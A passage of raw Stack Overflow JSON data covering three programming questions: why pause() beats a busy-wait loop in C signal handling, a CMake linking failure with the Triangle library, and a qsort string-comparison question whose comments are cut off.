"creation_date": 1518060202, "post_id": 48670218, "comment_id": 84352204, "body": "It would be useful to see exactly WHAT your materials said. pause () might be an efficient alternative in some situations but it might be less efficient in others."}, {"owner": {"reputation": 97, "user_id": 9253039, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh3.googleusercontent.com/-CgWhQCp3zl8/AAAAAAAAAAI/AAAAAAAAANI/rQTDJYKXoTs/photo.jpg?sz=128", "display_name": "Meltdown", "link": "https://stackoverflow.com/users/9253039/meltdown"}, "edited": false, "score": 0, "creation_date": 1518091939, "post_id": 48670218, "comment_id": 84367621, "body": "I Think that I get it,  the pause() will ofc &quot;sleep&quot; until it is interrupted and after that interrupt is handled it does the check if done. The variable is not checked when the program is paused and therefore the pause is still efficiant."}], "answers": [{"comments": [{"owner": {"reputation": 114796, "user_id": 214671, "user_type": "registered", "accept_rate": 78, "profile_image": "https://www.gravatar.com/avatar/f82954c7134fbe63282dc033fd52f3ab?s=128&d=identicon&r=PG", "display_name": "Matteo Italia", "link": "https://stackoverflow.com/users/214671/matteo-italia"}, "edited": false, "score": 0, "creation_date": 1518026320, "post_id": 48670343, "comment_id": 84338596, "body": "&quot;in the same time CPU can execute some other processes&quot; or, if there&#39;s nothing to do, it can be throttled down and in general be put in lower power modes. That&#39;s particularly important if you want your phone or laptop last when running on battery."}, {"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "reply_to_user": {"reputation": 3617, "user_id": 6243553, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/4jGJ2.jpg?s=128&g=1", "display_name": "HarshitMadhav", "link": "https://stackoverflow.com/users/6243553/harshitmadhav"}, "edited": false, "score": 0, "creation_date": 1518028008, "post_id": 48670343, "comment_id": 84339569, "body": "@HarshitAgrawal let say there is a <code>while(!done)</code> in  sub thread  and if it doesn&#39;t uses any <code>pause()</code> and keep on checking the variable, in that case what  if <code>main thread</code> has <code>stopped</code> but that <code>sub thread</code> is still <code>running</code> ? same scenario can be avoided if pause() used instead of <code>while(!done)</code>"}, {"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "reply_to_user": {"reputation": 3617, "user_id": 6243553, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/4jGJ2.jpg?s=128&g=1", "display_name": "HarshitMadhav", "link": "https://stackoverflow.com/users/6243553/harshitmadhav"}, "edited": false, "score": 0, "creation_date": 1518028330, "post_id": 48670343, "comment_id": 84339726, "body": "@HarshitAgrawal Also using only <code>while(!done)</code> consumes more CPU than <code>while(pause())</code>"}, {"owner": {"reputation": 3617, "user_id": 6243553, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/4jGJ2.jpg?s=128&g=1", "display_name": "HarshitMadhav", "link": "https://stackoverflow.com/users/6243553/harshitmadhav"}, "edited": false, "score": 0, "creation_date": 1518029400, "post_id": 48670343, "comment_id": 84340354, "body": "@achal thank you. I understood the concept very well. Great explanation from your side. I appreciate it. I upvoted the answer :)"}, {"owner": {"reputation": 11762, "user_id": 6530695, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/53a7a617c8e419f2562f0b00e6be10b1?s=128&d=identicon&r=PG&f=1", "display_name": "Tony", "link": "https://stackoverflow.com/users/6530695/tony"}, "edited": false, "score": 0, "creation_date": 1518042881, "post_id": 48670343, "comment_id": 84347324, "body": "Worth mentioning, context switch does waste some CPU cycles if signal is assured to be raised in less than 2*Context_Switch_time."}], "tags": [], "owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "is_accepted": false, "score": 7, "last_activity_date": 1518027340, "last_edit_date": 1518027340, "creation_date": 1518025921, "answer_id": 48670343, "question_id": 48670218, "link": "https://stackoverflow.com/questions/48670218/why-is-pause-efficient-use-of-the-cpu/48670343#48670343", "title": "Why is pause() &quot;efficient use of the CPU&quot;?", "body": "<p>why <code>pause()</code> is efficient ? Because <code>pause()</code> will <strong>block the execution of current process while has not received any signal</strong> and <em>by doing so that process will moved to suspend state and while this process is in suspend state, at the same time CPU can execute some other processes</em> and by doing this CPU utilized efficiently.</p>\n\n<p>From the Linux manual page of <a href=\"http://man7.org/linux/man-pages/man2/pause.2.html\" rel=\"nofollow noreferrer\"><code>pause(2)</code></a></p>\n\n<blockquote>\n  <p>pause()  causes the calling process (or thread) to sleep until a\n  signal\n         is delivered that either terminates the process or causes  the  invocation of a signal-catching function.</p>\n</blockquote>\n\n<p>The POSIX <a href=\"http://man7.org/linux/man-pages/man3/pause.3p.html\" rel=\"nofollow noreferrer\"><code>pause(3p)</code></a> man page says basically the same thing.</p>\n"}], "owner": {"reputation": 97, "user_id": 9253039, "user_type": "registered", "accept_rate": 80, "profile_image": "https://lh3.googleusercontent.com/-CgWhQCp3zl8/AAAAAAAAAAI/AAAAAAAAANI/rQTDJYKXoTs/photo.jpg?sz=128", "display_name": "Meltdown", "link": "https://stackoverflow.com/users/9253039/meltdown"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 412, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1518027340, "creation_date": 1518025491, "question_id": 48670218, "link": "https://stackoverflow.com/questions/48670218/why-is-pause-efficient-use-of-the-cpu", "title": "Why is pause() &quot;efficient use of the CPU&quot;?", "body": "<p>Taking a course in Operating systems and are new to this (and C), I dont really understand a fact stated in my studying material. \nThe program is suppose to pause execution until a kill-command is issued (ctr+c or kill from the terminal)\nFrom the beginning the line was:</p>\n\n<pre><code>while (!done);\n</code></pre>\n\n<p>but it was suggested to change this:</p>\n\n<p>\"Using a while loop to repeatedly check the global variable done is not a very efficient use of the CPU. A better way is to change the loop to:</p>\n\n<pre><code>while (pause()) {\n  if (done) break;\n};\n</code></pre>\n\n<p>\"</p>\n\n<p>What does the system do during pause()? If it have to check a global variable every loop can it really do something useful? I'm thinking that pause() probably allow the CPU to pick up other work, but doesn't the checking of the variable ruin that? </p>\n\n<p>The complete code is this if it helps:</p>\n\n<pre><code>#include &lt;stdio.h&gt;   // puts(), printf()\n#include &lt;signal.h&gt;  // SIGFPE, SIGSEGV, SIGINT\n#include &lt;stdlib.h&gt;  // exit(), EXIT_SUCCESS, EXIT_FAIURE\n#include &lt;unistd.h&gt;  // getpid(), pause()\n#include &lt;stdbool.h&gt; // true, false\n\nsig_atomic_t volatile done = false;\n\nint divide_by_zero() {\n  int a = 1;\n  int b = 0;\n  return a / b;\n}\n\nvoid segfault() {\n  int *ptr = NULL;\n  *ptr = 42;\n}\n\nvoid signal_handler(int s) {\n  switch(s) {\n    case SIGFPE:\n      fputs(\"Caught SIGFPE: arithmetic exception, such as division by zero.\\n\", stderr);\n      exit(EXIT_FAILURE);\n    case SIGSEGV:\n      fputs(\"Caught SIGSEGV: segfault.\\n\", stderr);\n      exit(EXIT_FAILURE);\n      break;\n    case SIGINT:\n      done = true;\n      fputs(\"Caught SIGINT: interactive attention signal, probably a ctrl+c.\\n\", stderr);\n      break;\n    case SIGUSR1:\n      puts(\"Hello!\");\n      break;\n  }\n}\n\nint main(void) {\n\n  printf(\"My PID = %ld\\n\", (long) getpid());\n\n  // Install signal handlers.\n  signal(SIGSEGV, signal_handler);\n  signal(SIGFPE,  signal_handler);\n  signal(SIGINT, signal_handler);\n  signal(SIGUSR1, signal_handler);\n\n  //divide_by_zero();\n  //segfault();\n\n  // Wait until a signal is delivered.\n\n  while(pause()) {\n      if(done) break;\n  };\n\n  puts(\"I'm done!\");\n\n  exit(EXIT_SUCCESS);\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "makefile", "cmake", "linker"], "comments": [{"owner": {"reputation": 360, "user_id": 5875805, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/S4zBy.jpg?s=128&g=1", "display_name": "Tormund Giantsbane", "link": "https://stackoverflow.com/users/5875805/tormund-giantsbane"}, "edited": false, "score": 0, "creation_date": 1518023290, "post_id": 48669411, "comment_id": 84336808, "body": "What does your Makefile look like?"}, {"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "reply_to_user": {"reputation": 360, "user_id": 5875805, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/S4zBy.jpg?s=128&g=1", "display_name": "Tormund Giantsbane", "link": "https://stackoverflow.com/users/5875805/tormund-giantsbane"}, "edited": false, "score": 0, "creation_date": 1518023552, "post_id": 48669411, "comment_id": 84336964, "body": "The makefile is generated by cmake."}], "answers": [{"comments": [{"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518023514, "post_id": 48669542, "comment_id": 84336944, "body": "But why does it work when building the sub directory? It also links the library"}, {"owner": {"reputation": 244, "user_id": 9177735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c90311d812036b4debfcf7aa866dec22?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/9177735/ben"}, "reply_to_user": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518023604, "post_id": 48669542, "comment_id": 84336990, "body": "In the sub directory you have <code>add_library(subdir_lib</code>. That allows the library to be added by the name subdir_lib."}, {"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518023724, "post_id": 48669542, "comment_id": 84337053, "body": "Yes, I have that: In the subdirectory: add_library(subdir_lib files/Test.cpp files/Test.h) target_link_libraries(subdir_lib         triangle), in the main directory add_executable(cmake_problem main.cpp)    target_link_libraries(cmake_problem         subdir_lib         triangle)"}, {"owner": {"reputation": 244, "user_id": 9177735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c90311d812036b4debfcf7aa866dec22?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/9177735/ben"}, "reply_to_user": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518023998, "post_id": 48669542, "comment_id": 84337211, "body": "Define triangle. You know it as the built file, but CMake doesn&#39;t know what it is. If you add the downloaded source as a sub directory, there is an add_library call naming the library &quot;triangle&quot;. Short of that, you have to tell CMake where the library is. Either you have to find it, or explicitly say where the built library exists."}, {"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518024910, "post_id": 48669542, "comment_id": 84337744, "body": "Even if I add <code>find_package(Triangle REQUIRED)</code> to both the CMakeLists.txt files it doesn&#39;t work. But Cmake does not stop the preocessing, which means it finds the packages.."}, {"owner": {"reputation": 244, "user_id": 9177735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c90311d812036b4debfcf7aa866dec22?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/9177735/ben"}, "reply_to_user": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518028385, "post_id": 48669542, "comment_id": 84339760, "body": "I&#39;m not sure how it found it. Are there any variables filled in when it&#39;s found?"}, {"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518033509, "post_id": 48669542, "comment_id": 84342700, "body": "Unfortunately not. None of the neither for the following is filled ${TRIANGLE_LIBRARIES}, ${TRIANGLE_LIBRARY}"}, {"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518036764, "post_id": 48669542, "comment_id": 84344368, "body": "These are the set variables after find_package(Triangle REQUIRED): ` -- Triangle_CONFIG=/usr/local/lib/cmake/Triangle/TriangleConfig&zwnj;&#8203;.cmake -- Triangle_CONSIDERED_CONFIGS=/usr/local/lib/cmake/Triangle/Tr&zwnj;&#8203;iangleConfig.cmake -- Triangle_CONSIDERED_VERSIONS=1.7.0 -- Triangle_DIR=/usr/local/lib/cmake/Triangle -- Triangle_FOUND=1 -- Triangle_VERSION=1.7.0 -- Triangle_VERSION_COUNT=3 -- Triangle_VERSION_MAJOR=1 -- Triangle_VERSION_MINOR=7 -- Triangle_VERSION_PATCH=0 -- Triangle_VERSION_TWEAK=0`"}, {"owner": {"reputation": 244, "user_id": 9177735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c90311d812036b4debfcf7aa866dec22?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/9177735/ben"}, "reply_to_user": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518036984, "post_id": 48669542, "comment_id": 84344490, "body": "My opinion is that you should take the folder as downloaded and include it in your project as an add_subdirectory, unless you want to mess with the package lookup. I can&#39;t say what may be the problem there."}, {"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518037876, "post_id": 48669542, "comment_id": 84344998, "body": "Unfortunately, adding the source directory as sub directory did not work either."}, {"owner": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "edited": false, "score": 0, "creation_date": 1518088318, "post_id": 48669542, "comment_id": 84365316, "body": "@Ben &quot;It seems that you tried to link a library that doesn&#39;t exist&quot;. It doesn&#39;t. If the linker cannot find a library it gives an error of the form <code>cannot find -lfoo</code>. It does not ignore this fact and proceed to give undefined reference errors to symbols in the missing library."}, {"owner": {"reputation": 244, "user_id": 9177735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c90311d812036b4debfcf7aa866dec22?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/9177735/ben"}, "edited": false, "score": 0, "creation_date": 1518091625, "post_id": 48669542, "comment_id": 84367406, "body": "That&#39;s assuming that CMake told the linker to use the library in the first place. He could verify by building with VERBOSE=1."}, {"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "reply_to_user": {"reputation": 45838, "user_id": 1362568, "user_type": "registered", "accept_rate": 55, "profile_image": "https://i.stack.imgur.com/EAFi0.jpg?s=128&g=1", "display_name": "Mike Kinghan", "link": "https://stackoverflow.com/users/1362568/mike-kinghan"}, "edited": false, "score": 0, "creation_date": 1518102610, "post_id": 48669542, "comment_id": 84375224, "body": "As @MikeKinghan said, I don&#39;t get the &quot;cannot find&quot; message: <code>subdir&#47;libsubdir_lib.a(Test.cpp.o): In function </code>Test::run()&#39;: Test.cpp:(.text+0xca): undefined reference to <code>triangle_context_create&#39; Test.cpp:(.text+0xf5): undefined reference to </code>triangle_context_options&#39; Test.cpp:(.text+0x12c): undefined reference to <code>triangle_mesh_create&#39; Test.cpp:(.text+0x159): undefined reference to </code>triangle_context_destroy&#39; collect2: error: ld returned 1 exit status make[2]: *** [cmake_problem] Error 1 make[1]: *** [CMakeFiles/cmake_problem.dir/all] Error 2 make: *** [all] Error 2`"}, {"owner": {"reputation": 244, "user_id": 9177735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c90311d812036b4debfcf7aa866dec22?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/9177735/ben"}, "edited": false, "score": 0, "creation_date": 1518107954, "post_id": 48669542, "comment_id": 84379008, "body": "My point is that there&#39;s a difference between the linker not finding the library and CMake not finding it. CMake has to tell the linker about it in the first place or you won&#39;t ever get the <code>-lfoo</code> on the command line in the first place. Run <code>make VERBOSE=1</code> and see what the linker is told."}, {"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518113451, "post_id": 48669542, "comment_id": 84382433, "body": "it is linking -ltriangle. here is a gist with the full output: <a href=\"https://gist.github.com/mimre25/b5f2258a57a4a76c9f5f3693bafc23fd\" rel=\"nofollow noreferrer\">gist.github.com/mimre25/b5f2258a57a4a76c9f5f3693bafc23fd</a> It seems like include files are missing... I&#39;ve also updated the cmakelists (see github link in first post)"}], "tags": [], "owner": {"reputation": 244, "user_id": 9177735, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c90311d812036b4debfcf7aa866dec22?s=128&d=identicon&r=PG&f=1", "display_name": "Ben", "link": "https://stackoverflow.com/users/9177735/ben"}, "is_accepted": false, "score": 0, "last_activity_date": 1518023386, "creation_date": 1518023386, "answer_id": 48669542, "question_id": 48669411, "link": "https://stackoverflow.com/questions/48669411/make-cmake-subdirectory-linking-to-external-library-fails/48669542#48669542", "title": "Make/Cmake subdirectory linking to external library fails", "body": "<p>It seems that you tried to link a library that doesn't exist (where CMake can find it).</p>\n\n<p>You either need to create a find_library, or when you link to triangle, give a full path with name.</p>\n\n<p>Alternatively, you can leave the source in a sub directory which you can call then link to the name.</p>\n"}, {"comments": [{"owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518454376, "post_id": 48737424, "comment_id": 84503576, "body": "Unfortunately I run into the same problem. It works all fine when building subdir_lib, but once I&#39;m in the upper most directory, I get <code>undefined reference to &#39;triangulate(char*, triangulateio*, triangulateio*, triangulateio*)&#39; collect2: error: ld returned 1 exit status</code>.. triangle is in a subdirector of subdir (I&#39;ve update the github repository)"}, {"owner": {"reputation": 126, "user_id": 6824382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/moX9K.jpg?s=128&g=1", "display_name": "Hashimoto", "link": "https://stackoverflow.com/users/6824382/hashimoto"}, "reply_to_user": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "edited": false, "score": 0, "creation_date": 1518455530, "post_id": 48737424, "comment_id": 84504322, "body": "Oh you should include the library like this: extern &quot;C&quot;{ #include &lt;triangle.h&gt; } if you are using it in C++."}], "tags": [], "owner": {"reputation": 126, "user_id": 6824382, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/moX9K.jpg?s=128&g=1", "display_name": "Hashimoto", "link": "https://stackoverflow.com/users/6824382/hashimoto"}, "is_accepted": true, "score": 1, "last_activity_date": 1518390253, "creation_date": 1518390253, "answer_id": 48737424, "question_id": 48669411, "link": "https://stackoverflow.com/questions/48669411/make-cmake-subdirectory-linking-to-external-library-fails/48737424#48737424", "title": "Make/Cmake subdirectory linking to external library fails", "body": "<p>I would have written this as a comment but I don't have enough reputation for that. Is this a situation where you need to use this Triangle (<a href=\"https://github.com/wo80/Triangle\" rel=\"nofollow noreferrer\">https://github.com/wo80/Triangle</a>), rather than the original Triangle (<a href=\"https://www.cs.cmu.edu/~quake/triangle.html\" rel=\"nofollow noreferrer\">https://www.cs.cmu.edu/~quake/triangle.html</a>)? If you can use the latter, I know from experience that its is very easy to link to. I just put it in a subdirectory in my code with this CMakeLists.txt. </p>\n\n<pre><code>## This only works for linux. Use an if statement to handle all architectures.\nSET(CMAKE_C_FLAGS\n  \"${CMAKE_C_FLAGS} -O -DLINUX -DTRILIBRARY -w -DANSI_DECLARATORS\"\n  )\n\nSET(FILES_SOURCE\n  triangle.h triangle.c\n  )\n\nADD_LIBRARY( my_local_name_for_triangle_library STATIC ${FILES_SOURCE} )\n</code></pre>\n\n<p>And then I can link to the triangle library I have created like this:</p>\n\n<pre><code>include_directories(my_local_triangle_dir)\ntarget_link_libraries(my_local_name_for_triangle_library)\n</code></pre>\n\n<p>However, some of the #define macros are missing in triangle.h, so you need to copy them from triangle.c to triangle.h.</p>\n"}], "owner": {"reputation": 82, "user_id": 7162326, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/72fc7b706882b2bbb80c30ac26cb9654?s=128&d=identicon&r=PG&f=1", "display_name": "mimre", "link": "https://stackoverflow.com/users/7162326/mimre"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 782, "favorite_count": 0, "accepted_answer_id": 48737424, "answer_count": 2, "score": 0, "last_activity_date": 1518390253, "creation_date": 1518022981, "question_id": 48669411, "link": "https://stackoverflow.com/questions/48669411/make-cmake-subdirectory-linking-to-external-library-fails", "title": "Make/Cmake subdirectory linking to external library fails", "body": "<p>I'm currently having trouble in the following setup:</p>\n\n<p>My main project has a subdirector that is a library. This library depends on a system library \"triangle\" (installed from source). The main project does use a file from the subdirectory.\nCmake of the main project (and the library) work fine.</p>\n\n<p>Building the library works just fine.\n(Either in it's own directory or after cmake in the main directory with \nmake subdir_lib compiles without problems)</p>\n\n<p>This is where the problems starts.\nBuilding the main project with make project fails. It happens during linking:</p>\n\n<pre><code>subdir/libsubdir_lib.a(Test.cpp.o): In function `Test::run()':\n/home/mimre/workspace/tmp/cmake-problem/subdir/files/Test.cpp:34: undefined reference to `triangle_context_create'\n/home/mimre/workspace/tmp/cmake-problem/subdir/files/Test.cpp:35: undefined reference to `triangle_context_options'\n/home/mimre/workspace/tmp/cmake-problem/subdir/files/Test.cpp:42: undefined reference to `triangle_mesh_create'\n/home/mimre/workspace/tmp/cmake-problem/subdir/files/Test.cpp:50: undefined reference to `triangle_context_destroy'\ncollect2: error: ld returned 1 exit status\nCMakeFiles/cmake_problem.dir/build.make:95: recipe for target 'cmake_problem' failed\nmake[3]: *** [cmake_problem] Error 1\nCMakeFiles/Makefile2:67: recipe for target 'CMakeFiles/cmake_problem.dir/all' failed\nmake[2]: *** [CMakeFiles/cmake_problem.dir/all] Error 2\nCMakeFiles/Makefile2:79: recipe for target 'CMakeFiles/cmake_problem.dir/rule' failed\nmake[1]: *** [CMakeFiles/cmake_problem.dir/rule] Error 2\nMakefile:118: recipe for target 'cmake_problem' failed\nmake: *** [cmake_problem] Error 2\n</code></pre>\n\n<p>To avoid having a wall of code in here, I uploaded a minimal example onto github: <a href=\"https://github.com/mimre25/cmake_problem\" rel=\"nofollow noreferrer\">https://github.com/mimre25/cmake_problem</a></p>\n\n<p>Also, this is the library I'm using, installed with cmake &amp; sudo make install: <a href=\"https://github.com/wo80/Triangle\" rel=\"nofollow noreferrer\">https://github.com/wo80/Triangle</a></p>\n\n<p>I've tried the solutions from various similar threads but to no avail.</p>\n\n<p>Thanks in advance for any help!</p>\n"}, {"tags": ["c", "arrays", "string", "sorting", "pointers"], "comments": [{"owner": {"reputation": 679, "user_id": 5155574, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FX9BZpOiVdk/AAAAAAAAAAI/AAAAAAAAAI0/cHgtmpGWfgM/photo.jpg?sz=128", "display_name": "Josh Abraham", "link": "https://stackoverflow.com/users/5155574/josh-abraham"}, "edited": false, "score": 0, "creation_date": 1518022941, "post_id": 48669339, "comment_id": 84336556, "body": "You haven&#39;t allocated anything for each char* in s.  Whereas the bottom example is allocated on the stack."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 679, "user_id": 5155574, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FX9BZpOiVdk/AAAAAAAAAAI/AAAAAAAAAI0/cHgtmpGWfgM/photo.jpg?sz=128", "display_name": "Josh Abraham", "link": "https://stackoverflow.com/users/5155574/josh-abraham"}, "edited": false, "score": 1, "creation_date": 1518023004, "post_id": 48669339, "comment_id": 84336605, "body": "@JoshAbraham In this very specific case, these are string literals and are allocated magically."}, {"owner": {"reputation": 395, "user_id": 8842262, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e1baccf9211f521d4bd0cf02bef8ce31?s=128&d=identicon&r=PG&f=1", "display_name": "Miradil Zeynalli", "link": "https://stackoverflow.com/users/8842262/miradil-zeynalli"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518023061, "post_id": 48669339, "comment_id": 84336652, "body": "@EugeneSh. as parameters for cmp stand void* pointers, which is okay. However, in order to get strings, I am using this method. Moreover, I looked many resources, all of them were doing this same method"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518023221, "post_id": 48669339, "comment_id": 84336755, "body": "@MiradilZeynalli Right. Disregard my first comment (deleted it anyway..)."}, {"owner": {"reputation": 679, "user_id": 5155574, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-FX9BZpOiVdk/AAAAAAAAAAI/AAAAAAAAAI0/cHgtmpGWfgM/photo.jpg?sz=128", "display_name": "Josh Abraham", "link": "https://stackoverflow.com/users/5155574/josh-abraham"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1518023601, "post_id": 48669339, "comment_id": 84336988, "body": "@EugeneSh. could you explain further?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "reply_to_user": {"reputation": 679, 